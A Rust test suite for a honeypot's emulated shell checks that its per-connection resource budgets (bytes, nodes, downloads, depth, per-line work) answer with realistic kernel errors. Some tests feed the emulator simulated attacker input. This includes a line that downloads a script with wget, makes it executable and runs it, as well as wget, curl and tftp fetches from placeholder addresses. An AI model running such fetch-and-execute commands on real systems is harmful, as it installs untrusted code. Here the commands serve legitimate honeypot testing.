//! What the connection budget does to a shell: every cap answers in the kernel's own words, every
//! shell of one connection spends the same allowance, and a session under the limits is untouched.
//! Each test drives a real `FakeShell` through `handle_input` with limits small enough to reach.

use std::sync::Arc;

use super::eval::DepthGuard;
use super::{BudgetHit, EmitContext, FakeShell, FsDenied, FsEffect, TraceEventKind};
use crate::budget::{BudgetLimits, ConnectionBudget};
use crate::fakefs::FakeFs;

fn ctx() -> EmitContext {
    EmitContext {
        source_ip: "203.0.113.7".parse().unwrap(),
        wan_ip: None,
        authenticated: true,
        protocol_label: "ssh".to_string(),
        session_id: None,
    }
}

fn shell_on(budget: &Arc<ConnectionBudget>) -> FakeShell {
    FakeShell::new(FakeFs::new(), ctx()).with_budget(budget.clone())
}

fn limited(edit: impl FnOnce(&mut BudgetLimits)) -> (FakeShell, Arc<ConnectionBudget>) {
    let mut limits = BudgetLimits::standard();
    edit(&mut limits);
    let budget = ConnectionBudget::new(limits);
    (shell_on(&budget), budget)
}

/// The `Denied` effects the last line recorded, wherever they nested.
fn denials(sh: &FakeShell) -> Vec<(String, FsDenied)> {
    fn walk(command: &super::CommandTrace, out: &mut Vec<(String, FsDenied)>) {
        for effect in &command.fs_effects {
            if let FsEffect::Denied { path, why } = effect {
                out.push((path.clone(), *why));
            }
        }
        for inner in &command.reentry {
            walk(inner, out);
        }
    }
    let mut out = Vec::new();
    for segment in &sh.last_trace().segments {
        if let Some(command) = &segment.command {
            walk(command, &mut out);
        }
    }
    out
}

fn markers(events: &[sensor_wire::SensorEvent], flood: &str) -> usize {
    events
        .iter()
        .filter(|e| e.metadata.get("flood").and_then(|v| v.as_str()) == Some(flood))
        .count()
}

fn downloads(events: &[sensor_wire::SensorEvent]) -> usize {
    events
        .iter()
        .filter(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_FILE_DOWNLOAD)
        .count()
}

/// `n` distinct fetches on one line.
fn fetch_line(first: u32, n: u32) -> String {
    (first..first + n)
        .map(|i| format!("wget http://198.51.100.{i}/x"))
        .collect::<Vec<_>>()
        .join("; ")
}

// ---- owned bytes ----------------------------------------------------------------------------

#[test]
fn a_write_past_the_content_budget_prints_no_space_and_earlier_writes_stand() {
    let (mut sh, budget) = limited(|l| l.owned_bytes = 100);
    // Each file costs its 7-byte path plus 11 bytes of content: five fit in 100.
    for i in 0..5 {
        let (out, _) = sh.handle_input(format!("echo aaaaaaaaaa > /tmp/f{i}"));
        assert_eq!((out.status, out.is_empty()), (0, true), "write {i} fits");
    }
    assert_eq!(budget.owned_bytes_used(), 90);

    let (out, _) = sh.handle_input("echo aaaaaaaaaa > /tmp/f5");
    assert_eq!(out.status, 1);
    assert_eq!(out, "echo: write error: No space left on device\n");
    assert_eq!(
        denials(&sh),
        vec![("/tmp/f5".to_string(), FsDenied::NoSpace)]
    );
    assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::OwnedBytes));
    assert_eq!(
        budget.owned_bytes_used(),
        97,
        "only the empty file the shell had already opened (its 7-byte path) was charged"
    );
    assert_eq!(sh.handle_input("cat /tmp/f0").0, "aaaaaaaaaa\n");
}

#[test]
fn cp_past_the_content_budget_says_cannot_create() {
    let (mut sh, _) = limited(|l| l.owned_bytes = 100);
    for i in 0..5 {
        sh.handle_input(format!("echo aaaaaaaaaa > /tmp/f{i}"));
    }
    let (out, _) = sh.handle_input("cp /tmp/f0 /tmp/copy");
    assert_eq!(out.status, 1);
    assert_eq!(
        out,
        "cp: cannot create regular file '/tmp/copy': No space left on device\n"
    );
    assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::OwnedBytes));
}

#[test]
fn a_saved_download_past_the_budget_is_reported_by_each_fetcher() {
    let (mut sh, _) = limited(|l| l.owned_bytes = 100);
    // The canned body is 80 bytes: the first save fits, the second does not.
    assert_eq!(
        sh.handle_input("wget -q -O /tmp/a http://198.51.100.1/x")
            .0
            .status,
        0
    );
    let (out, _) = sh.handle_input("wget -q -O /tmp/b http://198.51.100.1/x");
    assert_eq!(out.status, 1);
    assert_eq!(out, "Cannot write to '/tmp/b' (No space left on device).\n");
    let (out, _) = sh.handle_input("curl -o /tmp/c http://198.51.100.1/x");
    assert_eq!(out.status, 23);
    assert_eq!(out, "curl: (23) Failure writing output to destination\n");
    let (out, _) = sh.handle_input("busybox tftp -g -r d -l /tmp/d 198.51.100.1");
    assert_eq!(out.status, 1);
    assert_eq!(out, "tftp: can't open '/tmp/d': No space left on device\n");
}

#[test]
fn one_write_over_the_whole_budget_is_file_too_large_and_the_cap_itself_fits() {
    let (mut sh, _) = limited(|l| l.owned_bytes = 100);
    // 90 letters, the newline and the 9-byte path are exactly 100 bytes.
    let fits = format!("echo {} > /tmp/fits", "a".repeat(90));
    assert_eq!(sh.handle_input(fits).0.status, 0);

    let (mut sh, budget) = limited(|l| l.owned_bytes = 100);
    let too_big = format!("echo {} > /tmp/big", "a".repeat(100));
    let (out, _) = sh.handle_input(too_big);
    assert_eq!(out.status, 1);
    assert_eq!(out, "echo: write error: File too large\n");
    assert_eq!(
        denials(&sh),
        vec![("/tmp/big".to_string(), FsDenied::FileTooLarge)]
    );
    assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::OwnedBytes));
    assert_eq!(
        budget.owned_bytes_used(),
        8,
        "only the 8-byte path of the file the shell had opened"
    );
}

// ---- nodes ----------------------------------------------------------------------------------

#[test]
fn a_node_past_the_budget_is_refused_and_removing_a_file_does_not_free_its_slot() {
    let (mut sh, budget) = limited(|l| l.overlay_nodes = 5);
    for i in 0..5 {
        assert_eq!(sh.handle_input(format!(">/tmp/n{i}")).0.status, 0);
    }
    assert_eq!(budget.overlay_nodes_used(), 5);

    let (out, _) = sh.handle_input(">/tmp/n5");
    assert_eq!(out.status, 1);
    assert_eq!(out, "-bash: /tmp/n5: No space left on device\n");
    assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::Nodes));
    let (out, _) = sh.handle_input("mkdir /tmp/d");
    assert_eq!(
        out,
        "mkdir: cannot create directory '/tmp/d': No space left on device\n"
    );

    // The tombstone `rm` leaves is a node: a different path still finds no room.
    assert_eq!(sh.handle_input("rm /tmp/n0").0.status, 0);
    assert_eq!(budget.overlay_nodes_used(), 5, "rm frees no slot");
    let (out, _) = sh.handle_input(">/tmp/other");
    assert_eq!(out, "-bash: /tmp/other: No space left on device\n");
    // The removed path's own slot is still its own.
    assert_eq!(sh.handle_input(">/tmp/n0").0.status, 0);
}

#[test]
fn mkdir_p_reports_a_refusal_in_a_parent_it_was_creating() {
    let (mut sh, _) = limited(|l| l.overlay_nodes = 2);
    let (out, _) = sh.handle_input("mkdir -p /tmp/a/b/c");
    assert_eq!(out.status, 1);
    assert_eq!(
        out,
        "mkdir: cannot create directory '/tmp/a/b/c': No space left on device\n"
    );
}

#[test]
fn removing_a_baked_file_never_fails_for_want_of_a_node() {
    let (mut sh, budget) = limited(|l| l.overlay_nodes = 1);
    assert_eq!(sh.handle_input(">/tmp/x").0.status, 0);
    let (out, _) = sh.handle_input("rm /etc/hostname");
    assert_eq!((out.status, out.is_empty()), (0, true));
    assert_eq!(budget.overlay_nodes_used(), 2, "the tombstone still counts");
}

// ---- names ----------------------------------------------------------------------------------

#[test]
fn an_overlong_name_is_refused_before_anything_is_charged() {
    let (mut sh, budget) = limited(|_| {});
    let long_component = "a".repeat(256);

    let (out, _) = sh.handle_input(format!(">/tmp/{long_component}"));
    assert_eq!(out.status, 1);
    assert_eq!(
        out,
        format!("-bash: /tmp/{long_component}: File name too long\n")
    );
    assert_eq!(
        denials(&sh),
        vec![(format!("/tmp/{long_component}"), FsDenied::NameTooLong)]
    );
    let (out, _) = sh.handle_input(format!("mkdir /tmp/{long_component}"));
    assert_eq!(
        out,
        format!("mkdir: cannot create directory '/tmp/{long_component}': File name too long\n")
    );
    let (out, _) = sh.handle_input(format!("cp /etc/hostname /tmp/{long_component}"));
    assert_eq!(
        out,
        format!("cp: cannot create regular file '/tmp/{long_component}': File name too long\n")
    );
    assert_eq!(
        budget.overlay_nodes_used(),
        0,
        "a refused name charges no node"
    );

    // 255 bytes is the longest component; 4096 the longest path.
    assert_eq!(
        sh.handle_input(format!(">/tmp/{}", "a".repeat(255)))
            .0
            .status,
        0
    );
    let chunk = format!("/{}", "b".repeat(99));
    let path = |n: usize| chunk.repeat(42)[..n].to_string();
    let (out, _) = sh.handle_input(format!(">{}", path(4_097)));
    assert!(out.contains("File name too long"), "{out}");
    let (out, _) = sh.handle_input(format!(">{}", path(4_096)));
    assert!(
        !out.contains("File name too long"),
        "4096 is within the limit, and is refused for its missing parent instead: {out}"
    );
}

// ---- downloads ------------------------------------------------------------------------------

#[test]
fn nine_urls_on_one_line_record_eight_and_one_cap_marker() {
    let (mut sh, _) = limited(|_| {});
    let (_, events) = sh.handle_input(fetch_line(1, 9));
    assert_eq!(downloads(&events), 8);
    assert_eq!(markers(&events, "download_cap"), 1);
    assert_eq!(
        events.len(),
        1 + 8 + 1,
        "the command event, the downloads, the marker"
    );
    assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::DownloadPerLine));
    assert_eq!(
        sh.last_trace()
            .events
            .iter()
            .filter(|kind| **kind == TraceEventKind::FloodDownloadCap)
            .count(),
        1
    );

    // The per-line cap refused nothing from the connection's allowance, and the marker is spent.
    let (_, events) = sh.handle_input(fetch_line(20, 9));
    assert_eq!(downloads(&events), 8);
    assert_eq!(
        markers(&events, "download_cap"),
        0,
        "one marker per connection"
    );
}

#[test]
fn a_connection_past_its_download_allowance_records_none_more_and_keeps_answering() {
    let (mut sh, _) = limited(|l| l.download_events = 5);
    for i in 1..=5 {
        let (_, events) = sh.handle_input(format!("wget http://198.51.100.{i}/x"));
        assert_eq!(
            downloads(&events),
            1,
            "download {i} is within the allowance"
        );
    }
    let (out, events) = sh.handle_input("wget http://198.51.100.6/x");
    assert_eq!(downloads(&events), 0);
    assert_eq!(markers(&events, "download_cap"), 1);
    assert!(out.contains("saved"), "the shell still answers: {out}");
    let (out, events) = sh.handle_input("wget http://198.51.100.7/x");
    assert_eq!(downloads(&events), 0);
    assert_eq!(markers(&events, "download_cap"), 0);
    assert!(out.contains("saved"));
}

// ---- depth ----------------------------------------------------------------------------------

#[test]
fn re_entry_is_refused_at_the_depth_cap_and_silently() {
    let mut sh = FakeShell::new(FakeFs::new(), ctx());
    assert_eq!(BudgetLimits::standard().max_depth, 16);

    sh.depth = DepthGuard::at(15);
    let (out, _) = sh.handle_input("busybox echo hi");
    assert_eq!(out, "hi\n", "depth 15 may still enter one level");
    assert_eq!(sh.last_trace().budget.max_depth_reached, 16);
    assert_eq!(sh.last_trace().budget.hit, None);
    assert_eq!(sh.depth.current(), 15, "depth is restored after the entry");

    sh.depth = DepthGuard::at(16);
    let (out, _) = sh.handle_input("busybox echo hi");
    assert_eq!((out.status, out.is_empty()), (1, true));
    assert_eq!(sh.last_trace().budget.max_depth_reached, 16);
    assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::Depth));
    assert_eq!(sh.depth.current(), 16);
}

#[test]
fn sh_dash_c_re_enters_through_the_same_cap() {
    let (mut sh, _) = limited(|l| l.max_depth = 1);
    // `busybox sh -c echo` enters twice: the applet, then the script.
    let (out, _) = sh.handle_input("busybox sh -c echo");
    assert!(out.is_empty(), "the script's entry is refused: {out:?}");
    assert_eq!(sh.last_trace().budget.max_depth_reached, 1);
    assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::Depth));

    let (mut sh, _) = limited(|l| l.max_depth = 2);
    assert_eq!(sh.handle_input("busybox sh -c echo").0, "\n");
    assert_eq!(sh.last_trace().budget.max_depth_reached, 2);
}

// ---- per-line work --------------------------------------------------------------------------

#[test]
fn a_line_past_its_work_allowance_stops_mid_line() {
    let (mut sh, _) = limited(|l| l.work_per_line = 1_500_000);
    // `cat /dev/zero` produces a megabyte: the second one passes the allowance.
    let (out, _) = sh.handle_input("cat /dev/zero; cat /dev/zero; echo tail");
    assert!(
        !out.contains("tail"),
        "no segment runs after the allowance is spent"
    );
    assert_eq!(out.bytes().len(), 2 * (1 << 20));
    assert_eq!(sh.last_trace().segments.len(), 2);
    assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::Work));
    assert!(sh.last_trace().budget.work_charged > 1_500_000);

    // The allowance is per line: the next line has all of it again.
    let (out, _) = sh.handle_input("echo ok");
    assert_eq!(out, "ok\n");
    assert_eq!(sh.last_trace().budget.hit, None);
}

#[test]
fn output_sent_to_a_file_spends_the_line_allowance_too() {
    // Room for two megabyte files, so it is the line allowance that runs out, not the content one.
    let (mut sh, _) = limited(|l| {
        l.work_per_line = 1_500_000;
        l.owned_bytes = 1 << 30;
    });
    sh.handle_input("cat /dev/zero > /tmp/a; cat /dev/zero > /tmp/b; echo tail");
    assert_eq!(sh.last_trace().segments.len(), 2);
    assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::Work));
}

#[test]
fn a_nested_command_spends_the_callers_allowance_instead_of_a_fresh_one() {
    let mut sh = FakeShell::new(FakeFs::new(), ctx());
    assert_eq!(sh.handle_input("busybox echo hi").0, "hi\n");
    let total = sh.last_trace().budget.work_charged;

    // The entry into the applet is the last charge before the 3 bytes of output, so an allowance
    // 4 short of the total runs out exactly there.
    let (mut sh, _) = limited(|l| l.work_per_line = total - 4);
    let (out, _) = sh.handle_input("busybox echo hi");
    assert!(
        out.is_empty(),
        "the applet must not run on a fresh allowance: {out:?}"
    );
    assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::Work));

    let (mut sh, _) = limited(|l| l.work_per_line = total);
    assert_eq!(sh.handle_input("busybox echo hi").0, "hi\n");
    assert_eq!(sh.last_trace().budget.hit, None);
}

// ---- one budget for a connection ------------------------------------------------------------

#[test]
fn shells_on_one_budget_share_its_content_allowance() {
    let write = |sh: &mut FakeShell, n: usize| -> usize {
        (0..n)
            .filter(|i| {
                sh.handle_input(format!("echo aaaaaaaaaa > /tmp/w{i}"))
                    .0
                    .status
                    == 0
            })
            .count()
    };
    let (mut alone, _) = limited(|l| l.owned_bytes = 100);
    assert_eq!(
        write(&mut alone, 12),
        5,
        "a fresh budget fits five 18-byte files"
    );

    let (mut first, budget) = limited(|l| l.owned_bytes = 100);
    let mut second = shell_on(&budget);
    assert_eq!(write(&mut first, 3), 3);
    assert_eq!(
        write(&mut second, 12),
        2,
        "the second shell only has what the first left"
    );
}

#[test]
fn shells_on_one_budget_share_one_command_ceiling_and_one_marker() {
    let budget = ConnectionBudget::new(BudgetLimits::standard());
    let mut shells: Vec<FakeShell> = (0..4).map(|_| shell_on(&budget)).collect();
    // 4 streams of 64 lines are the connection's 256 command events.
    let mut emitted = 0;
    let mut early_markers = 0;
    for sh in &mut shells {
        for _ in 0..64 {
            let (_, events) = sh.handle_input("true");
            emitted += events.len();
            early_markers += markers(&events, "command_cap");
        }
    }
    assert_eq!(emitted, 256, "every line up to the ceiling is one event");
    assert_eq!(early_markers, 0);

    let mut marker_events = 0;
    let mut command_events = 0;
    for sh in &mut shells {
        for _ in 0..10 {
            let (_, events) = sh.handle_input("true");
            marker_events += markers(&events, "command_cap");
            command_events += events.len() - markers(&events, "command_cap");
        }
    }
    assert_eq!(
        command_events, 0,
        "no shell gets a command event past the shared ceiling"
    );
    assert_eq!(marker_events, 1, "and the whole connection gets one marker");
}

// ---- what one shell keeps -------------------------------------------------------------------

/// A line of `len` letters that differs for every `seed`.
fn distinct(seed: usize, len: usize) -> String {
    let mut state = seed.wrapping_mul(2_654_435_761).wrapping_add(1);
    (0..len)
        .map(|_| {
            state = state
                .wrapping_mul(6_364_136_223_846_793_005)
                .wrapping_add(1);
            char::from(b'a' + u8::try_from((state >> 33) % 26).unwrap())
        })
        .collect()
}

#[test]
fn history_keeps_64_kib_of_lines_dropping_the_oldest() {
    let mut sh = FakeShell::new(FakeFs::new(), ctx());
    // 200 lines of 1005 bytes: 65 of them fit in 64 KiB, with the `history` line itself.
    for i in 0..200 {
        sh.handle_input(format!("echo {}", distinct(i, 1000)));
    }
    let (out, _) = sh.handle_input("history | wc -l");
    assert_eq!(out, "66\n");
    let (out, _) = sh.handle_input("history");
    assert!(
        !out.to_string().contains(&distinct(0, 1000)),
        "the oldest line went"
    );
    assert!(
        out.to_string().contains(&distinct(199, 1000)),
        "the newest stayed"
    );
}

#[test]
fn export_of_a_new_name_counts_against_the_content_allowance() {
    let base = FakeShell::new(FakeFs::new(), ctx()).state().owned_bytes();
    // Three 3-byte names fit in 10 bytes; five do not.
    let (mut sh, _) = limited(|l| l.owned_bytes = u64::try_from(base + 10).unwrap());
    sh.handle_input("export zz0 zz1 zz2 zz3 zz4");
    assert_eq!(sh.handle_input("env | grep -c '^zz'").0, "3\n");
}

// ---- files a command reads are charged at the read ------------------------------------------

/// The work a line charged.
fn work_of(sh: &mut FakeShell, line: &str) -> u64 {
    sh.handle_input(line);
    sh.last_trace().budget.work_charged
}

/// The modeled size of `/bin/busybox` (past the 1 MiB `READ_CAP`, which is why `wc` of it
/// through a redirect reports less).
fn busybox_len() -> u64 {
    let sh = FakeShell::new(FakeFs::new(), ctx());
    sh.fs
        .stat("/bin/busybox", true)
        .expect("the image is modeled")
        .size
}

/// Each command reads the image to print or use a byte of it (or nothing), and must be billed
/// for the read: with only the output charged, a loop of any of them never ran out and froze the
/// sensor.
#[test]
fn a_file_read_for_a_byte_of_output_is_charged_whole() {
    let size = busybox_len();
    assert!(size >= 1 << 20, "the image is big enough to matter: {size}");
    for (line, wanted) in [
        ("tail -c 1 /bin/busybox > /dev/null", size),
        ("tail -n 1 /bin/busybox > /dev/null", size),
        ("grep -F -f /bin/busybox /dev/null", size),
        ("wc -c /bin/busybox > /dev/null", size),
        ("md5sum /bin/busybox > /dev/null", size),
        ("dd if=/bin/busybox of=/tmp/x 2>/dev/null", size),
        // These ask the filesystem for only the bytes they use.
        ("head -c 1 /bin/busybox > /dev/null", 1),
        ("od -N 1 /bin/busybox > /dev/null", 1),
        ("xxd -l 1 /bin/busybox > /dev/null", 1),
    ] {
        let mut sh = FakeShell::new(FakeFs::new(), ctx());
        let work = work_of(&mut sh, line);
        assert!(
            work >= wanted,
            "{line}: charged {work}, the read is {wanted}"
        );
    }
}

/// A reader that prints what it read costs the line once, not twice.
#[test]
fn a_reader_that_prints_its_read_is_not_charged_twice() {
    let size = busybox_len();
    let (mut sh, _) = limited(|l| l.work_per_line = size + size / 2);
    let work = work_of(&mut sh, "cat /bin/busybox > /dev/null");
    assert!(
        work >= size && work < size + size / 2,
        "once, not twice: {work}"
    );
    assert_eq!(sh.last_trace().budget.hit, None);
}

/// Every place the shell takes bytes out of the filesystem. `read_operand` is the door for a
/// file a command was told to read and charges the line itself; `read_charged` is the other
/// charging helper. Anything else listed here reads a fixed system file of a few KiB that no
/// operand names, or charges at the call (noted per file). A new direct read fails this test
/// until it is routed through those helpers or listed here with its reason.
#[test]
fn every_direct_filesystem_read_is_accounted_for() {
    let allowed: &[(&str, usize)] = &[
        // `read_operand` (`read_range`) and `read_charged` (`read_all`): the charging helpers.
        ("read.rs", 2),
        // `crontab -l` prints what it reads, and the output is charged; `-e` reads zero bytes.
        ("admin.rs", 2),
        // The ELF header: `HEADER_LEN` bytes.
        ("arch.rs", 1),
        // Fixed system files, each capped at a few KiB.
        ("hostinfo.rs", 1),
        ("fileinfo.rs", 2),
        ("sysres.rs", 1),
        ("nameinfo.rs", 1),
        ("procs.rs", 2),
        // `>>` append and the typed-assembly tracker (eval), `sh FILE` (mod), the loader hash:
        // each charges the bytes at the call.
        ("eval.rs", 2),
        ("mod.rs", 1),
        ("loader.rs", 1),
    ];
    let expected: std::collections::BTreeMap<String, usize> = allowed
        .iter()
        .map(|(name, count)| ((*name).to_string(), *count))
        .collect();
    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src/shell");
    let mut found: std::collections::BTreeMap<String, usize> = std::collections::BTreeMap::new();
    for entry in std::fs::read_dir(&dir).expect("the shell source directory") {
        let path = entry.expect("a directory entry").path();
        let name = path
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or_default()
            .to_string();
        if !name.ends_with(".rs") || name.ends_with("tests.rs") {
            continue;
        }
        let source = std::fs::read_to_string(&path).expect("a source file");
        let count: usize = source
            .lines()
            .filter(|line| !line.trim_start().starts_with("//"))
            .map(|line| line.matches(".read_all(").count() + line.matches(".read_range(").count())
            .sum();
        if count > 0 {
            found.insert(name, count);
        }
    }
    assert_eq!(
        found, expected,
        "a direct filesystem read was added or removed: route it through read_operand or \
         read_charged, or account for it in this list"
    );
}

// ---- untouched sessions ---------------------------------------------------------------------

#[test]
fn a_session_well_under_the_limits_hits_no_cap() {
    let mut sh = FakeShell::new(FakeFs::new(), ctx());
    for line in [
        "uname -a",
        "cd /tmp && wget http://198.51.100.9/x.sh -O x.sh && chmod +x x.sh && ./x.sh",
        "cp /bin/busybox /tmp/b; /tmp/b; rm /tmp/b",
        "busybox wget http://198.51.100.9/y; sh -c id",
    ] {
        sh.handle_input(line);
        assert_eq!(sh.last_trace().budget.hit, None, "{line}");
        assert!(sh.last_trace().budget.work_charged > 0, "{line}");
    }
}
